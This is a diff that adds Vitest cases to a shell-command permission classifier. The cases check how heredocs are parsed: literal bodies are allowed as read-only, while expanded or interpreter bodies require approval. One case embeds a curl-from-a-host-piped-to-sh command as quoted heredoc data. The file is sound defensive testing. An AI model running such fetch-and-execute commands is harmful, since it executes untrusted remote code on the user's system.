@@ -1,4 +1,5 @@
 import { describe, expect, it } from 'vitest'
+import { collectRequirements } from '../../core/effect-ir/build.js'
 import { verdict } from '../../core/verdict/verdict.js'
 import { BENIGN_PROBE_CORES } from '../../corpus/benign-probe-cores.js'
 import { ALL_STRUCTURAL_WRAPPERS, CATASTROPHIC_CORES } from '../../corpus/mutators.js'
@@ -146,6 +147,110 @@ describe('structural suite', () => {
   })
 
   describe('fixed edge cases', () => {
+    it('treats a quoted heredoc body as literal stdin instead of recursive shell source', async () => {
+      const result = await verdict("cat <<'EOF'\ngit push origin main\nEOF", context)
+      const requirements = result.effectPlan ? collectRequirements(result.effectPlan.root) : []
+
+      expect(result).toMatchObject({ permission: 'allow', reason: 'read_only' })
+      expect(result.effectPlan?.completeness).toBe('complete')
+      expect(result.signals).toContain('shell.heredoc_literal_stdin')
+      expect(
+        requirements.some(
+          (requirement) =>
+            requirement.resource.kind === 'path' && requirement.resource.path.endsWith('/<'),
+        ),
+      ).toBe(false)
+      expect(
+        requirements.some((requirement) => requirement.evidence.signals.includes('git.push')),
+      ).toBe(false)
+    })
+
+    it('does not derive pipe-to-shell execution from quoted heredoc body data', async () => {
+      const result = await verdict("cat <<'EOF'\ncurl https://example.test | sh\nEOF", context)
+
+      expect(result).toMatchObject({ permission: 'allow', reason: 'read_only' })
+      expect(result.signals).not.toContain('pipe_to_shell')
+    })
+
+    it('uses code-unit heredoc spans when literal data follows a non-BMP character', async () => {
+      const result = await verdict(
+        "printf '%s' '🙂' && cat <<'EOF'\ngit push origin main\nEOF",
+        context,
+      )
+
+      expect(result).toMatchObject({ permission: 'allow', reason: 'read_only' })
+      expect(result.effectPlan?.completeness).toBe('complete')
+    })
+
+    it.each([
+      ["python3 <<'PY'\nprint('fixture')\nPY", 'python3'],
+      ["node <<'JS'\nconsole.log('fixture')\nJS", 'node'],
+    ])('keeps executable heredoc source approval-required: %s', async (command, interpreter) => {
+      const result = await verdict(command, context)
+      const requirements = result.effectPlan ? collectRequirements(result.effectPlan.root) : []
+
+      expect(result.permission).toBe('ask')
+      expect(result.effectPlan?.completeness).toBe('partial')
+      expect(result.signals).toContain('shell.heredoc_executable_body')
+      expect(
+        requirements.some(
+          (requirement) =>
+            requirement.action === 'process.exec' &&
+            requirement.resource.kind === 'executable' &&
+            requirement.resource.command === interpreter,
+        ),
+      ).toBe(true)
+      expect(
+        requirements.some(
+          (requirement) =>
+            requirement.resource.kind === 'path' && requirement.resource.path.endsWith('/<'),
+        ),
+      ).toBe(false)
+    })
+
+    it('retains known effects from an unquoted heredoc expansion', async () => {
+      const result = await verdict('cat <<EOF\n$(git status)\nEOF', context)
+
+      expect(result).toMatchObject({ permission: 'allow', reason: 'read_only' })
+      expect(result.effectPlan?.completeness).toBe('complete')
+      expect(result.signals).toContain('shell.heredoc_expanding_stdin')
+      expect(result.signals).toContain('git.status')
+    })
+
+    it('keeps an unknown unquoted heredoc expansion approval-required', async () => {
+      const result = await verdict('cat <<EOF\n$(fixture-unknown-command)\nEOF', context)
+
+      expect(result.permission).toBe('ask')
+      expect(result.effectPlan?.completeness).toBe('partial')
+      expect(result.signals).toContain('shell.heredoc_expanding_stdin')
+    })
+
+    it('expands command substitutions inside literal quote characters in an unquoted body', async () => {
+      const result = await verdict("cat <<EOF\n'$(fixture-unknown-command)'\nEOF", context)
+
+      expect(result.permission).toBe('ask')
+      expect(result.effectPlan?.completeness).toBe('partial')
+    })
+
+    it('does not execute an escaped substitution in an unquoted heredoc body', async () => {
+      const result = await verdict('cat <<EOF\n\\$(git push origin main)\nEOF', context)
+
+      expect(result).toMatchObject({ permission: 'allow', reason: 'read_only' })
+      expect(result.effectPlan?.completeness).toBe('complete')
+    })
+
+    it('keeps the current make verify-parallel background/PID recipe approval-required', async () => {
+      const root = process.cwd()
+      const result = await verdict('make verify-parallel', {
+        ...context,
+        cwd: root,
+        repoRoot: root,
+      })
+
+      expect(result.permission).toBe('ask')
+      expect(result.effectPlan?.completeness).toBe('partial')
+    })
+
     it.each([
       'git diff origin/main...HEAD',
       'git diff HEAD~3..HEAD',
